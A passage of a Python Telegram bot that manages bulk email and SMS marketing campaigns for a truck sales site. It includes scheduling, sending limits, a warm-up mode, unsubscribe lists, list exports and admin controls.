        await update.message.reply_text(
            "Usage:\n/setsms Your message here. Visit us: https://truckforsaleusa.com\n\nReply STOP to unsubscribe."
        )
        return
    state["sms_message"] = payload
    save_state(state)
    await update.message.reply_text(f"✅ SMS message updated:\n{payload}")

@require_admin
async def previewsms(update, context):
    state = load_state()
    text = (
        "📱 *SMS PREVIEW*\n\n"
        f"*Message:*\n{state.get('sms_message', 'Not set')}\n\n"
        f"📱 Stored phones: {len(state.get('phones', []))}\n"
        f"✅ Sent: {len(state.get('sent_phones', []))}\n"
        f"❌ Failed: {len(state.get('failed_phones', []))}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def testsms(update, context):
    state = load_state()
    payload = update.message.text.replace("/testsms", "", 1).strip()
    phones = extract_phones(payload)
    if not phones:
        await update.message.reply_text("Usage:\n/testsms +12125551234")
        return
    if not CLICKSEND_USERNAME or not CLICKSEND_API_KEY:
        await update.message.reply_text("❌ CLICKSEND_USERNAME or CLICKSEND_API_KEY not set in Railway.")
        return
    test_phone = phones[0]
    await update.message.reply_text(f"📤 Sending test SMS to {test_phone}...")
    try:
        resp = send_clicksend_sms(test_phone, state.get("sms_message", "Test message"))
        data = resp.json()
        status = data.get("data", {}).get("messages", [{}])[0].get("status", "unknown")
        if resp.status_code == 200 and status == "SUCCESS":
            await update.message.reply_text(f"✅ Test SMS sent to {test_phone}")
        else:
            await update.message.reply_text(
                f"❌ SMS failed.\nStatus: {resp.status_code}\nResponse: {resp.text[:400]}"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@require_admin
async def sendtexts(update, context):
    state = load_state()
    if not CLICKSEND_USERNAME or not CLICKSEND_API_KEY:
        await update.message.reply_text("❌ CLICKSEND_USERNAME or CLICKSEND_API_KEY not set in Railway.")
        return
    phones = state.get("phones", [])
    if not phones:
        await update.message.reply_text("📭 No phone numbers stored. Use /addphones first.")
        return
    message = state.get("sms_message", "")
    if not message:
        await update.message.reply_text("❌ No SMS message set. Use /setsms first.")
        return
    unsent = [p for p in phones if p not in state.get("sent_phones", [])]
    if not unsent:
        await update.message.reply_text("📭 All phones already sent to.")
        return
    await update.message.reply_text(
        f"🚀 SMS campaign started!\n📱 Sending to {len(unsent)} numbers..."
    )
    sent = 0
    failed = 0
    for phone in unsent:
        try:
            resp = send_clicksend_sms(phone, message)
            data = resp.json()
            status = data.get("data", {}).get("messages", [{}])[0].get("status", "")
            if resp.status_code == 200 and status == "SUCCESS":
                sent += 1
                state["sent_phones"] = dedupe_keep_order(state.get("sent_phones", []) + [phone])
            else:
                failed += 1
                state["failed_phones"] = state.get("failed_phones", []) + [phone]
            save_state(state)
        except Exception as e:
            failed += 1
            state["failed_phones"] = state.get("failed_phones", []) + [phone]
            save_state(state)
        await asyncio.sleep(1)  # 1 second between sends to avoid rate limits
    await update.message.reply_text(
        f"🎉 SMS campaign done!\n"
        f"✅ Sent: {sent}\n"
        f"❌ Failed: {failed}"
    )


# ---------------------------------------------------------------------------
# Feature 1: Better Status Dashboard
# ---------------------------------------------------------------------------

@require_admin
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    reset_hourly_counter_if_needed(state)
    reset_daily_counter_if_needed(state)
    save_state(state)

    hourly_limit = state.get("hourly_limit", 0)
    hourly_sent = state.get("hourly_sent_count", 0)
    secs_left = seconds_until_next_hour_window(state)

    # Email stats
    total_emails = len(state.get("emails", []))
    sent_emails = len(state.get("sent_emails", []))
    failed_emails = len(state.get("failed_emails", []))
    unsent_emails = total_emails - sent_emails

    # SMS stats
    total_phones = len(state.get("phones", []))
    sent_phones = len(state.get("sent_phones", []))
    failed_phones = len(state.get("failed_phones", []))
    unsent_phones = total_phones - sent_phones

    # Campaign state
    is_running = state.get("campaign_task_running", False)
    is_paused = state.get("paused", False)
    if is_running:
        camp_status = "🟢 Running"
    elif is_paused:
        camp_status = "⏸ Paused"
    else:
        camp_status = "⭕ Idle"

    text = (
        "╔══════════════════════╗\n"
        "     📊 CAMPAIGN DASHBOARD\n"
        "╚══════════════════════╝\n\n"
        f"🔄 *Status:* {camp_status}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📧 *EMAIL STATS*\n"
        f"┣ Total: {total_emails}\n"
        f"┣ ✅ Sent: {sent_emails}\n"
        f"┣ ❌ Failed: {failed_emails}\n"
        f"┗ 📤 Unsent: {unsent_emails}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📱 *SMS STATS*\n"
        f"┣ Total: {total_phones}\n"
        f"┣ ✅ Sent: {sent_phones}\n"
        f"┣ ❌ Failed: {failed_phones}\n"
        f"┗ 📤 Unsent: {unsent_phones}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⏱ *RATE LIMITS*\n"
        f"┣ Daily: {state.get('daily_sent_count', 0)}/{DAILY_LIMIT}\n"
        f"┣ Hourly: {hourly_sent}/{hourly_limit if hourly_limit > 0 else '∞'}\n"
        f"┗ Hour resets in: {secs_left // 60}m {secs_left % 60}s\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ *Last error:* {state['last_run'].get('last_error', '') or 'None'}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ---------------------------------------------------------------------------
# Feature 2: Export Lists
# ---------------------------------------------------------------------------

@require_admin
async def exportemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    lines = []
    lines.append("=== ALL EMAILS ===")
    for e in state.get("emails", []):
        tag = "SENT" if e in state.get("sent_emails", []) else ("FAILED" if e in state.get("failed_emails", []) else "UNSENT")
        lines.append(f"{tag}: {e}")
    lines.append(f"\nTotal: {len(state.get('emails', []))}")
    lines.append(f"Sent: {len(state.get('sent_emails', []))}")
    lines.append(f"Failed: {len(state.get('failed_emails', []))}")

    content = "\n".join(lines)
    file_path = BASE_DIR / "email_export.txt"
    file_path.write_text(content, encoding="utf-8")

    await update.message.reply_document(
        document=open(file_path, "rb"),
        filename="email_list.txt",
        caption=f"📧 Email export — {len(state.get('emails', []))} total"
    )

@require_admin
async def exportphones(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    lines = []
    lines.append("=== ALL PHONES ===")
    for p in state.get("phones", []):
        tag = "SENT" if p in state.get("sent_phones", []) else ("FAILED" if p in state.get("failed_phones", []) else "UNSENT")
        lines.append(f"{tag}: {p}")
    lines.append(f"\nTotal: {len(state.get('phones', []))}")
    lines.append(f"Sent: {len(state.get('sent_phones', []))}")
    lines.append(f"Failed: {len(state.get('failed_phones', []))}")

    content = "\n".join(lines)
    file_path = BASE_DIR / "phone_export.txt"
    file_path.write_text(content, encoding="utf-8")

    await update.message.reply_document(
        document=open(file_path, "rb"),
        filename="phone_list.txt",
        caption=f"📱 Phone export — {len(state.get('phones', []))} total"
    )

# ---------------------------------------------------------------------------
# Feature 3: Campaign History
# ---------------------------------------------------------------------------

@require_admin
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not LOG_FILE.exists():
        await update.message.reply_text("📭 No campaign history yet.")
        return

    try:
        logs = json.loads(LOG_FILE.read_text(encoding="utf-8"))
    except Exception:
        await update.message.reply_text("❌ Could not read history file.")
        return

    if not logs:
        await update.message.reply_text("📭 No campaign history yet.")
        return

    # Show last 10 campaigns
    recent = logs[-10:]
    text = "📈 *CAMPAIGN HISTORY* (last 10)\n\n"
    for i, log in enumerate(reversed(recent), 1):
        result_emoji = "✅" if log.get("result") == "completed" else "⚠️"
        text += (
            f"{result_emoji} *Campaign {i}*\n"
            f"┣ Date: {log.get('time', 'Unknown')}\n"
            f"┣ Sent: {log.get('sent', 0)}\n"
            f"┣ Failed: {log.get('failed', 0)}\n"
            f"┗ Result: {log.get('result', 'unknown')}\n\n"
        )

    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def exporthistory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not LOG_FILE.exists():
        await update.message.reply_text("📭 No campaign history yet.")
        return
    await update.message.reply_document(
        document=open(LOG_FILE, "rb"),
        filename="campaign_history.json",
        caption="📈 Full campaign history export"
    )


# ---------------------------------------------------------------------------
# Feature 1: Multi-admin management
# ---------------------------------------------------------------------------

@require_admin
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/addadmin", "", 1).strip()
    if not payload.isdigit():
        await update.message.reply_text(
            "Usage:\n/addadmin 123456789\n\nGet a Telegram ID by forwarding a message from that person to @userinfobot"
        )
        return
    admins = state.get("extra_admins", [])
    if payload in [str(a) for a in admins]:
        await update.message.reply_text("⚠️ That ID is already an admin.")
        return
    admins.append(payload)
    state["extra_admins"] = admins
    save_state(state)
    await update.message.reply_text(f"✅ Admin added: {payload}\n👥 Total admins: {len(admins) + 1}")

@require_admin
async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/removeadmin", "", 1).strip()
    admins = state.get("extra_admins", [])
    if payload not in [str(a) for a in admins]:
        await update.message.reply_text("❌ That ID is not in the admin list.")
        return
    admins = [a for a in admins if str(a) != payload]
    state["extra_admins"] = admins
    save_state(state)
    await update.message.reply_text(f"✅ Admin removed: {payload}")

@require_admin
async def listadmins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    admins = state.get("extra_admins", [])
    text = f"👥 *ADMINS*\n\n🔑 Main admin: {ADMIN_CHAT_ID}\n"
    if admins:
        for i, a in enumerate(admins, 1):
            text += f"┣ Admin {i}: {a}\n"
    else:
        text += "No extra admins added yet."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ---------------------------------------------------------------------------
# Feature 3: Unsubscribe tracker
# ---------------------------------------------------------------------------

@require_admin
async def unsubscribed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    unsub_emails = state.get("unsubscribed_emails", [])
    unsub_phones = state.get("unsubscribed_phones", [])
    text = (
        "🚫 *UNSUBSCRIBED LIST*\n\n"
        f"📧 Emails: {len(unsub_emails)}\n"
        f"📱 Phones: {len(unsub_phones)}"
    )
    if unsub_emails:
        text += "\n\n*Emails:*\n" + "\n".join(unsub_emails[:20])
        if len(unsub_emails) > 20:
            text += f"\n...and {len(unsub_emails) - 20} more"
    if unsub_phones:
        text += "\n\n*Phones:*\n" + "\n".join(unsub_phones[:20])
        if len(unsub_phones) > 20:
            text += f"\n...and {len(unsub_phones) - 20} more"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def unsubscribe_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually add an email to unsubscribe list"""
    state = load_state()
    payload = update.message.text.replace("/unsub", "", 1).strip().lower()
    emails = extract_emails(payload)
    if not emails:
        await update.message.reply_text("Usage:\n/unsub email@example.com")
        return
    unsub = state.get("unsubscribed_emails", [])
    added = 0
    for e in emails:
        if e not in unsub:
            unsub.append(e)
            added += 1
        # Also remove from active lists
        state["emails"] = [x for x in state.get("emails", []) if x != e]
        state["sent_emails"] = [x for x in state.get("sent_emails", []) if x != e]
    state["unsubscribed_emails"] = unsub
    save_state(state)
    await update.message.reply_text(f"✅ Added {added} email(s) to unsubscribe list and removed from campaign.")

# ---------------------------------------------------------------------------
# Feature 4: SMS STOP handler (auto-remove)
# ---------------------------------------------------------------------------

async def handle_sms_stop(phone: str):
    """Called when someone replies STOP to remove them from phone list"""
    state = load_state()
    unsub = state.get("unsubscribed_phones", [])
    if phone not in unsub:
        unsub.append(phone)
    state["unsubscribed_phones"] = unsub
    state["phones"] = [p for p in state.get("phones", []) if p != phone]
    state["sent_phones"] = [p for p in state.get("sent_phones", []) if p != phone]
    save_state(state)
    logging.info(f"Auto-removed {phone} from SMS list (STOP reply)")

# ---------------------------------------------------------------------------
# Feature 5: Auto Scheduler
# ---------------------------------------------------------------------------

@require_admin
async def setschedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /setschedule 09:00 email
    /setschedule 14:30 sms
    /setschedule 10:00 both
    """
    state = load_state()
    payload = update.message.text.replace("/setschedule", "", 1).strip()
    parts = payload.split()
    if len(parts) != 2:
        await update.message.reply_text(
            "Usage:\n/setschedule HH:MM type\n\nExamples:\n"
            "/setschedule 09:00 email\n"
            "/setschedule 14:30 sms\n"
            "/setschedule 10:00 both"
        )
        return
    sched_time, sched_type = parts[0], parts[1].lower()
    if not re.match(r"^\d{2}:\d{2}$", sched_time):
        await update.message.reply_text("❌ Time must be in HH:MM format e.g. 09:00")
        return
    if sched_type not in ("email", "sms", "both"):
        await update.message.reply_text("❌ Type must be: email, sms, or both")
        return
    state["scheduled_time"] = sched_time
    state["scheduled_type"] = sched_type
    state["scheduler_enabled"] = True
    save_state(state)
    await update.message.reply_text(
        f"✅ Scheduler set!\n"
        f"⏰ Time: {sched_time} daily\n"
        f"📤 Type: {sched_type.upper()}\n\n"
        f"Use /stopschedule to cancel."
    )

@require_admin
async def stopschedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["scheduler_enabled"] = False
    state["scheduled_time"] = ""
    state["scheduled_type"] = ""
    save_state(state)
    await update.message.reply_text("✅ Scheduler stopped.")

@require_admin
async def schedulestatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if state.get("scheduler_enabled"):
        await update.message.reply_text(
            f"⏰ *SCHEDULER*\n\n"
            f"Status: 🟢 Active\n"
            f"Time: {state.get('scheduled_time', 'Not set')} daily\n"
            f"Type: {state.get('scheduled_type', 'Not set').upper()}",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text("⏰ Scheduler is not active.\nUse /setschedule to set one.")

async def scheduler_tick(app):
    """Background task that checks every minute if it is time to run a campaign"""
    while True:
        try:
            await asyncio.sleep(60)
            state = load_state()
            if not state.get("scheduler_enabled"):
                continue
            scheduled_time = state.get("scheduled_time", "")
            if not scheduled_time:
                continue
            current_time = time.strftime("%H:%M")
            if current_time == scheduled_time:
                if state.get("campaign_task_running"):
                    continue
                sched_type = state.get("scheduled_type", "email")
                admin_id = int(ADMIN_CHAT_ID) if ADMIN_CHAT_ID else None
                if admin_id:
                    await app.bot.send_message(
                        chat_id=admin_id,
                        text=f"⏰ Scheduled {sched_type.upper()} campaign starting now!"
                    )
                if sched_type in ("email", "both"):
                    asyncio.create_task(campaign_runner(app, admin_id))
                if sched_type in ("sms", "both"):
                    asyncio.create_task(sms_campaign_runner(app, admin_id))
        except Exception as e:
            logging.error(f"Scheduler error: {e}")

async def sms_campaign_runner(app, chat_id: int):
    """Background SMS campaign runner for scheduler"""
    state = load_state()
    phones = state.get("phones", [])
    message = state.get("sms_message", "")
    if not phones or not message:
        return
    unsent = [p for p in phones if p not in state.get("sent_phones", [])]
    sent = 0
    failed = 0
    for phone in unsent:
        try:
            resp = send_clicksend_sms(phone, message)
            data = resp.json()
            status = data.get("data", {}).get("messages", [{}])[0].get("status", "")
            if resp.status_code == 200 and status == "SUCCESS":
                sent += 1
                state["sent_phones"] = dedupe_keep_order(state.get("sent_phones", []) + [phone])
            else:
                failed += 1
                state["failed_phones"] = state.get("failed_phones", []) + [phone]
            save_state(state)
        except Exception:
            failed += 1
        await asyncio.sleep(1)
    if chat_id:
        await app.bot.send_message(
            chat_id=chat_id,
            text=f"📱 Scheduled SMS done!\n✅ Sent: {sent}\n❌ Failed: {failed}"
        )

# ---------------------------------------------------------------------------
# Feature 6: Warm-up mode
# ---------------------------------------------------------------------------

WARMUP_SCHEDULE = [5, 10, 20, 40, 80, 150, 250, 400, 500]  # emails per day per day

@require_admin
async def enablewarmup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["warmup_enabled"] = True
    state["warmup_day"] = 1
    state["warmup_start_date"] = time.strftime("%Y-%m-%d")
    save_state(state)
    await update.message.reply_text(
        "🔥 *Warm-up mode enabled!*\n\n"
        "Your sending limit will automatically increase each day:\n"
        "Day 1: 5/day\nDay 2: 10/day\nDay 3: 20/day\n"
        "Day 4: 40/day\nDay 5: 80/day\nDay 6: 150/day\n"
        "Day 7: 250/day\nDay 8: 400/day\nDay 9+: 500/day\n\n"
        "This builds your sender reputation and avoids spam! 🛡️",
        parse_mode=ParseMode.MARKDOWN
    )

@require_admin
async def disablewarmup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["warmup_enabled"] = False
    save_state(state)
    await update.message.reply_text("✅ Warm-up mode disabled.")

@require_admin
async def warmupstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if not state.get("warmup_enabled"):
        await update.message.reply_text(
            "🔥 Warm-up mode is OFF.\nUse /enablewarmup to turn it on."
        )
        return
    day = state.get("warmup_day", 1)
    idx = min(day - 1, len(WARMUP_SCHEDULE) - 1)
    todays_limit = WARMUP_SCHEDULE[idx]
    await update.message.reply_text(
        f"🔥 *WARM-UP STATUS*\n\n"
        f"📅 Day: {day}\n"
        f"📤 Today\'s limit: {todays_limit} emails\n"
        f"📊 Sent today: {state.get('daily_sent_count', 0)}\n\n"
        f"_Limits increase automatically each day_ 📈",
        parse_mode=ParseMode.MARKDOWN
    )

def get_warmup_daily_limit(state: Dict[str, Any]) -> int:
    """Return the daily limit based on warmup day, or DAILY_LIMIT if warmup off"""
    if not state.get("warmup_enabled"):
        return DAILY_LIMIT
    # Update warmup day based on start date
    start_date = state.get("warmup_start_date", "")
    if start_date:
        try:
            from datetime import datetime
            start = datetime.strptime(start_date, "%Y-%m-%d")
            today = datetime.now()
            day = (today - start).days + 1
            state["warmup_day"] = day
        except Exception:
            pass
    day = state.get("warmup_day", 1)
    idx = min(day - 1, len(WARMUP_SCHEDULE) - 1)
    return WARMUP_SCHEDULE[idx]

# ---------------------------------------------------------------------------
# Feature 9: Duplicate cleaner
# ---------------------------------------------------------------------------

@require_admin
async def cleanduplicates(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    # Clean emails
    original_emails = state.get("emails", [])
    clean_emails = dedupe_keep_order(original_emails)
    email_dupes = len(original_emails) - len(clean_emails)
    state["emails"] = clean_emails

    # Clean phones
    original_phones = state.get("phones", [])
    clean_phones = dedupe_keep_order(original_phones)
    phone_dupes = len(original_phones) - len(clean_phones)
    state["phones"] = clean_phones

    # Also remove unsubscribed from active lists
    unsub_emails = state.get("unsubscribed_emails", [])
    unsub_phones = state.get("unsubscribed_phones", [])
    before_emails = len(state["emails"])
    before_phones = len(state["phones"])
    state["emails"] = [e for e in state["emails"] if e not in unsub_emails]
    state["phones"] = [p for p in state["phones"] if p not in unsub_phones]
    removed_unsub_emails = before_emails - len(state["emails"])
    removed_unsub_phones = before_phones - len(state["phones"])

    save_state(state)
    await update.message.reply_text(
        f"🧹 *DUPLICATE CLEANER DONE*\n\n"
        f"📧 *Emails:*\n"
        f"┣ Duplicates removed: {email_dupes}\n"
        f"┣ Unsubscribed removed: {removed_unsub_emails}\n"
        f"┗ Clean list: {len(state['emails'])}\n\n"
        f"📱 *Phones:*\n"
        f"┣ Duplicates removed: {phone_dupes}\n"
        f"┣ Unsubscribed removed: {removed_unsub_phones}\n"
        f"┗ Clean list: {len(state['phones'])}",
        parse_mode=ParseMode.MARKDOWN
    )

def validate_startup():
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not RESEND_API_KEY:
        missing.append("RESEND_API_KEY")
    if not SENDER_EMAIL:
        missing.append("SENDER_EMAIL")
    if missing:
        raise RuntimeError(f"Missing environment variables: {', '.join(missing)}")

def main():
    validate_startup()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("addemails", addemails))
    app.add_handler(CommandHandler("clearemails", clearemails))
    app.add_handler(CommandHandler("setsubject", setsubject))
    app.add_handler(CommandHandler("setmessage", setmessage))
    app.add_handler(CommandHandler("setbutton1", setbutton1))
    app.add_handler(CommandHandler("setbutton2", setbutton2))
    app.add_handler(CommandHandler("preview", preview))
    app.add_handler(CommandHandler("testsend", testsend))
    app.add_handler(CommandHandler("sendcampaign", sendcampaign))
    app.add_handler(CommandHandler("pause", pause))
    app.add_handler(CommandHandler("resume", resume))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("sethourlylimit", sethourlylimit))    # NEW
    app.add_handler(CommandHandler("ratelimitstatus", ratelimitstatus))  # NEW
    # SMS commands
    app.add_handler(CommandHandler("addphones", addphones))
    app.add_handler(CommandHandler("clearphones", clearphones))
    app.add_handler(CommandHandler("setsms", setsms))
    app.add_handler(CommandHandler("previewsms", previewsms))
    app.add_handler(CommandHandler("testsms", testsms))
    app.add_handler(CommandHandler("sendtexts", sendtexts))
    # Professional features
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("exportemails", exportemails))
    app.add_handler(CommandHandler("exportphones", exportphones))
    app.add_handler(CommandHandler("history", history))
    app.add_handler(CommandHandler("exporthistory", exporthistory))
    # Multi-admin
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("listadmins", listadmins))
    # Unsubscribe
    app.add_handler(CommandHandler("unsubscribed", unsubscribed))
    app.add_handler(CommandHandler("unsub", unsubscribe_email))
    # Scheduler
    app.add_handler(CommandHandler("setschedule", setschedule))
    app.add_handler(CommandHandler("stopschedule", stopschedule))
    app.add_handler(CommandHandler("schedulestatus", schedulestatus))
    # Warm-up
    app.add_handler(CommandHandler("enablewarmup", enablewarmup))
    app.add_handler(CommandHandler("disablewarmup", disablewarmup))
    app.add_handler(CommandHandler("warmupstatus", warmupstatus))
    # Duplicate cleaner
    app.add_handler(CommandHandler("cleanduplicates", cleanduplicates))
    logging.info("Bot started (Resend edition)")
    # Start background scheduler
    async def post_init(application):
        asyncio.create_task(scheduler_tick(application))
    app.post_init = post_init
    app.run_polling()

if __name__ == "__main__":
    main()
